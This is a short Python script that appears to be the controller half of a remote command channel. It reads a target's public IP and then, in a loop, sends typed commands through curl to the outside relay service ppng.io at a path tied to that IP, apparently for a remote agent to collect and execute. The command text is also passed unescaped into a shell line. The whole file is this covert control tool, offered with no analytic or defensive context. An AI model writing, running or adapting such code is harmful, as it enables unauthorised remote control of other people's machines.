import requests
import subprocess

clients_ip = input("CLIENTS IP: ") ## client to connects ip address (public)

class Infinite:

    def Create():
        while True:
            cmd = input("COMMAND: ")
            subprocess.getoutput(f"echo {cmd} | curl -T - https://ppng.io/{clients_ip}-infinite")



if __name__ == "__main__":
    Infinite.Create()
